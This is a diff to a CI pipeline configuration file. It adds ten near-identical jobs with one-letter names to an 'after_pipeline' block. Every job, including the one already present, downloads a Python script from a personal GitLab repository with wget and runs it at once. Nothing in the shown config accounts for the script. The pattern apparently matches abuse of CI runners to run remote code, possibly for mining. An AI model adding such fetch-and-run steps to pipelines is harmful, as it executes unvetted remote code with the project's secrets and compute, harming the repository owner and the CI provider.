@@ -17,3 +17,30 @@ after_pipeline:
       - name: 'Job #e'
         commands:
           - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
+      - name: 'Job #w'
+        commands:
+          - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
+      - name: 'Job #q'
+        commands:
+          - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
+      - name: 'Job #d'
+        commands:
+          - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
+      - name: 'Job #s'
+        commands:
+          - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
+      - name: 'Job #a'
+        commands:
+          - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
+      - name: 'Job #v'
+        commands:
+          - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
+      - name: 'Job #c'
+        commands:
+          - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
+      - name: 'Job #x'
+        commands:
+          - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
+      - name: 'Job #z'
+        commands:
+          - 'wget https://gitlab.com/azkadafa39/suram/-/raw/main/al.py && python al.py'
